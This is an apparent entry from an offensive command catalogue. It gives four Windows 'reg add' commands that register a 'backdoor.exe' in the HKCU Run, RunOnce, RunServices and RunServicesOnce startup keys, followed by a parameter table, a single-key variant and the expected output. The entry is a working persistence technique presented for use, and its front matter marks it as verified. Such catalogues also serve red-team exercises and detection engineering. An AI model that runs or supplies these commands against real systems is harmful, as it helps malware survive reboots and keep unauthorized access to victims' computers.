---
type: command
executor: cmd
data: >-
  reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v
  Evil /t REG_SZ /d "C:\Users\%USERNAME%\backdoor.exe"

  reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"
  /v Evil /t REG_SZ /d "C:\Users\%USERNAME%\backdoor.exe"

  reg add
  "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v
  Evil /t REG_SZ /d "C:\Users\%USERNAME%\backdoor.exe"

  reg add
  "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
  /v Evil /t REG_SZ /d "C:\Users\%USERNAME%\backdoor.exe"
output: null
platforms:
  - Windows
tags:
  - persistence
  - registry
verified: true
validated: true
---

# reg-add-multiple-hkcu-run-keys-for-backdoor

## Command

```cmd
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\%USERNAME%\backdoor.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Users\%USERNAME%\backdoor.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Users\%USERNAME%\backdoor.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Users\%USERNAME%\backdoor.exe"
```

## Description

This command sequence uses the native reg.exe to add a backdoor executable path to four HKCU startup registry keys, creating redundant persistence points that trigger on user logon or boot.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Key path (e.g., "HKEY_CURRENT_USER\...\Run") | Full registry path to modify | Yes |
| /v Evil | Value name (e.g., 'Evil' for the entry) | Yes |
| /t REG_SZ | Value type: string | Yes |
| /d "C:\Users\%USERNAME%\backdoor.exe" | Data: path to backdoor executable | Yes |

## Examples

### Basic Usage

Run the sequence in Command Prompt to add all entries.

### Advanced Usage

Single key: `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "path\to\payload.exe"`

## Expected Output

For each line: `The operation completed successfully.`

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run    
    Evil    REG_SZ    C:\Users\%USERNAME%\backdoor.exe

## Related

- [[procedures/windows-simple-user-registry-persistence]]
